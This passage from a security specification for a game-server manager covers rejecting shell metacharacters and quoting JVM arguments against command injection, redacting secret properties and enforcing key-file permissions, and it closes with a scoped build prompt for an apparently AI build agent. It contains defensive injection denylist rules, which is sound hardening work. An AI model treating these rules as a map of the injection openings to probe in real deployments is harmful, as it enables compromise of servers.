3. UNKNOWN: Whether any operator legitimately uses `!`, `{`, or `}` inside
   JVM flags (rejected without observed use; 422 reason tells them to report it).

---

## 12. Recorded Owner Decisions (fixed — implement as specified)

- **D-S1-KEYS — Un-tightenable key file (POSIX):** refuse startup via
  `SecurityPermissionError`, with opt-out `AppSettings.allow_insecure_keys`
  (`ONX_ALLOW_INSECURE_KEYS`, `MCS_` legacy accepted). Permissive-continue
  without the flag is rejected.
- **D-S1-STORED-ARGS — Stored unsafe arguments:** reject start loudly
  (`ProviderError` → 503); silent sanitize-and-run is rejected.
- **D-S1-PROPS-NOTE — `server.properties` note:** unchanged this batch; the
  `permissions.yaml:227,231` note correction rides a future D2 with the
  behavior decision.

---

## 13. Change Log (v1.0 review → v1.1 resolution)

| # | Source | Resolution section |
|---|---|---|
| R1 | Review 1: single secret-matching rule; drop bare-`key` suffix; negative tests | §3 S1.2.1 (`is_secret_property_key` [NEW], normalizer canonical, regex deleted); §7.3 (`monkey`/`turkey`/`level-seed`/`query.port` visible; `serverPassword`/`api-key` redacted) |
| R2 | Review 2: state settings-UI function loss + residual files risk | §3 S1.2.2 (view/set/clear impossible via settings/PATCH; rotation via Files); §5 + §6.2 (narrowed exposure: any-viewer → files-granted) |
| R3 | Review 3: backslash grammar + `local_windows.py` sentence | §3 S1.1.1 (spaces/`\`/`:` allowed, metachars rejected); §3 S1.1.2 + §4 row (no-change scoping, `local_windows.py:297-302`) |
| R4 | Review 4: `..` rejection or drop claim; exposure statement | §3 S1.1.1 (`..` segment rejection; no-schema-field exposure via `repository.py:166-183`) |
| R5 | Review 5: stored-args contract is 503, not 400/422 | §2 S1.1 (mapping evidence `errors.py:158-162`), §3 S1.1.3, §5, §6.1 |
| R6 | Review 6: `exec` behavior delta + PID test | §3 S1.1.2 (delta stated); §7.2 (`test_local_provider_start_exec_prefix_and_pid_resolution`) |
| R7 | Review 7: (new file) marks, `tmp_path`/Ruff, typo, `0o077` test, exception home, frontend alignment | §7 preamble + §7.3/§7.4/§7.5; §3 S1.3 (`(mode & 0o077)`, home `exceptions.py`, lifespan propagation `main.py:87,93`); typo fixed §2 S1.1 |
| Va | Consumers of read path (RCON/health/metrics safety) | §3 S1.2.1 placement justification (single caller `read_models.py:230` → `get_server.py:16,37`; independent disk/env readers cited) |
| Vb | `startup_command`/import-scan injection sources | §2 S1.1 (fixed literals `installer_provisioner.py:108-130`, `import_service.py:279-283`, `filesystem_reconciliation.py:1104`); §3 S1.1.1 (denylist on elements) + §3 S1.1.2 (jar-name quoting) + §6.6 |
| Vc | Memory/CPU/port types and interpolation | §6.5 (`server.py:23-25` vs `:49-51`; `local.py:155,253`; digit-only test §7.2) |
| Vd | PATCH `java_args` validation path | §4 row + §3 S1.1.3 (`update_server_config.py:93-94`; create `create_server.py:147`); 500→422 stated §2 S1.1/§5 |
| Ve | `%` in legitimate flags | Allowed by grammar (§3 S1.1.1, evidence `test_repositories.py:95-117`); pinned in §7.1 |
| Vf | `KNOWN_PROPERTY_KEYS` + other serializers | §2 S1.2 (zero `rcon` hits; only consumers `types.ts:34`, `ServerSettingsSection.tsx`, its test); §7.3 fixture note |
| X1 | New CONFLICT found in v1.1 verification (not in review): v1.0 allowlist vs ISS-009 | Grammar redesigned deny-list-behind-quoting (§3 S1.1.1); rationale + preserved test cited |
| X2 | New: `repository.py:184` except-clause interaction | §3 S1.1.1 (`except InvalidValueError: raise` added before the generic fallback; loud failure + DB-surgery repair; §6.1) |

---

## 14. Build Prompt (copy-paste executor handoff — Release Critical track, D1)

> ROLE: Build agent implementing SPEC-2026-10-05-SECURITY-BATCH-S1-01 Rev 1.1.
> TASK: Implement S1.1 + S1.2 + S1.3 exactly as specified in §§3–7 below. No design
> changes — spec ambiguities are D1+: stop and ask, do not reinterpret.
>
> BOOTSTRAP FIRST (in order): project contributor guide → project documentation → project state tracking
> → project governance standards§12 (Release Critical track, D1) → project engineering policies
> (`core-principles.md`, `scope-and-implementation.md`,
> `testing-and-verification.md`, `commit-and-safety.md`,
> `documentation-and-state.md`). State BOOTSTRAP COMPLETE, then start.
> Read-only roles stay read-only; you are the executor, so you may edit ONLY the
> files listed under ALLOW below.
>
> SCOPE LOCK — ALLOW (and nothing else):
> `backend/app/modules/server/domain/value_objects.py`,
> `backend/app/modules/server/infrastructure/providers/local.py`,
> `backend/app/modules/server/infrastructure/providers/remote.py`,
> `backend/app/modules/server/application/read_models.py`,
> `backend/app/modules/server/application/commands/update_server_config.py`,
> `backend/app/core/security_files.py` ([NEW]),
> `backend/app/core/exceptions.py` (append `SecurityPermissionError` only),
> `backend/app/core/config.py` (append `allow_insecure_keys` field only),
> `backend/app/modules/auth/infrastructure/jwt.py`,
> `backend/app/modules/storage/encryption.py`,
> `frontend/src/server_manager/components/ServerSettingsSection.tsx`
> (`jvmFlagsValid` only), plus the test files named in §7
> (`test_value_objects.py`, `test_providers.py`, `test_servers.py` [NEW],
> `test_key_permissions.py` [NEW], `ServerSettingsSection.test.tsx` fixture
> if secret-bearing). FORBIDDEN: `contracts/permissions.yaml`,
> `backend/app/modules/server/infrastructure/repository.py` (especially the
> `except` at `:184` — do NOT widen), `SENSITIVE_FILENAMES`, any router guard,
> project state tracking (executor does not update state), any other spec/doc.
>
> ORDER (sequential; each step green before the next):
> 1. S1.1 grammar (§3 S1.1.1): `_reject_shell_metachars` + constructor wiring.
>    Prove ISS-009 vectors still pass and §7.1 rejects raise. Affected tests
>    first: `backend/tests/domain/test_value_objects.py`,
>    `backend/tests/infrastructure/test_repositories.py::TestSQLServerRepository::test_save_and_reload_complex_jvm_args`.
> 2. S1.1 quoting (§3 S1.1.2–3.1.3): per-token `shlex.quote` + `exec` in both
>    providers; stored-config revalidation → `ProviderError`. Run §7.2 tests.
> 3. S1.2 (§3 S1.2.1–2): normalizer + omission + write-path drops. Run §7.3 tests.
> 4. S1.3 (§3 S1.3): `security_files.py` + exception + settings field + both
>    call sites. Run §7.4 tests. Manual check: `python -c` import of the app
>    with a `0644` temp key file tightens it (POSIX); do NOT touch the real
>    `backend/config/` keys during verification.
> 5. Frontend `jvmFlagsValid` alignment (§7.5) + full gates (below).
>
> VERIFICATION (mandatory, report exact commands + counts):
> `cd backend && python -m pytest <affected files> -q` per step (2-min timeout
> each); then sequential full suite `python -m pytest -q` (≥15-min timeout;
> `-n auto` is dev-only, never milestone evidence) + frontend `vitest run` for
> the touched spec file; then all six `scripts/check-*` gates. DB tests use
> `tmp_path` only. Known flaky (ignore iff sole failure):
> `tests/application/test_supervisor.py::TestRuntimeSupervisor::test_health_check_detects_process_death`
> ( rerun ×3 to confirm flake). Retry hard stop: same failure twice → stop,
> re-read the error, escalate as a finding — no third variant.
>
> STOP CONDITIONS (do not push through): any §7 preserved test fails
> (ISS-009 roundtrip, `test_value_objects.py:304-326`, download-200 test at
> `test_batch7:471-475`); any gate red; any ambiguity about placeholder
> handling, bypass-flag semantics, or error codes. Report back with evidence.
> DO NOT COMMIT unless explicitly told (leave working tree dirty + report).
> Final report: files changed, commands run with counts (sequential vs `-n auto`
> labeled), what was NOT verified, and any UNVERIFIED carried forward.
